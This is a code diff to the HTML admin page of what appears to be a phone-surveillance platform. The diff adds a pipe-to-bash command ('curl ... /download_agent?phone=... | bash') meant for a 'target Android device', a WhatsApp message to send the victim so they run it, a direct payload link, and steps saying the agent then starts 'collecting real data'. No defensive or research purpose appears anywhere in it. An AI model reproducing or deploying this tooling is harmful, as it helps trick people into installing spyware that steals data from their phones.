@@ -16,6 +16,7 @@
         .btn-back { background: #6c757d; color: white; text-decoration: none; display: inline-block; margin-top: 20px; }
         .btn-back:hover { background: #5a6268; }
         .notification { position: fixed; top: 20px; right: 20px; background: #28a745; color: white; padding: 15px 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); display: none; z-index: 1000; }
+        .command-box { background: #000; color: #00ff00; padding: 15px; border-radius: 8px; font-family: monospace; margin: 15px 0; }
     </style>
 </head>
 <body>
@@ -30,23 +31,45 @@
         </div>
         
         <div class="info-card">
+            <h3>🚀 Installation Command</h3>
+            <p>Run this command in Termux on the target Android device:</p>
+            <div class="command-box" id="commandText">
+                curl -s {{ platform_url }}/download_agent?phone={{ agent_id }} | bash
+            </div>
+            <button class="btn btn-copy" onclick="copyToClipboard('curl -s {{ platform_url }}/download_agent?phone={{ agent_id }} | bash')">
+                📋 Copy Command
+            </button>
+        </div>
+        
+        <div class="info-card">
             <h3>📱 Send WhatsApp Message</h3>
             <p>Send this exact message to the target phone via WhatsApp:</p>
             <div class="link-box">
-                <strong>{{ whatsapp_message }}</strong>
+                <strong>Install MP Agent: Run this in Termux: curl -s {{ platform_url }}/download_agent?phone={{ agent_id }} | bash</strong>
             </div>
-            <button class="btn btn-copy" onclick="copyToClipboard('{{ whatsapp_message }}')">
+            <button class="btn btn-copy" onclick="copyToClipboard('Install MP Agent: Run this in Termux: curl -s {{ platform_url }}/download_agent?phone={{ agent_id }} | bash')">
                 📋 Copy Message
             </button>
         </div>
         
         <div class="info-card">
-            <h3>🔗 Direct Link</h3>
+            <h3>🔗 Direct Download Link</h3>
             <p>Or send this link directly:</p>
-            <input type="text" class="link-input" value="{{ malicious_link }}" readonly id="directLink">
-            <button class="btn btn-copy" onclick="copyToClipboard('{{ malicious_link }}')">
+            <input type="text" class="link-input" value="{{ platform_url }}/download_agent?phone={{ agent_id }}" readonly id="directLink">
+            <button class="btn btn-copy" onclick="copyToClipboard('{{ platform_url }}/download_agent?phone={{ agent_id }}')">
                 📋 Copy Link
             </button>
+        </div>
+        
+        <div class="info-card">
+            <h3>📋 Step-by-Step Instructions</h3>
+            <ol style="margin-left: 20px; line-height: 2;">
+                <li>Install Termux from F-Droid on target Android device</li>
+                <li>Open Termux and paste the installation command</li>
+                <li>Wait for the agent to install and register</li>
+                <li>Agent will automatically start collecting real data</li>
+                <li>Check the dashboard to see the agent status</li>
+            </ol>
         </div>
         
         <a href="/admin" class="btn btn-back">← Back to Dashboard</a>
@@ -95,6 +118,14 @@
         // Make the direct link input click-to-select
         document.getElementById('directLink').addEventListener('click', function() {
             this.select();
+        });
+
+        // Make the command box click-to-select
+        document.getElementById('commandText').addEventListener('click', function() {
+            const range = document.createRange();
+            range.selectNode(this);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
         });
     </script>
 </body>
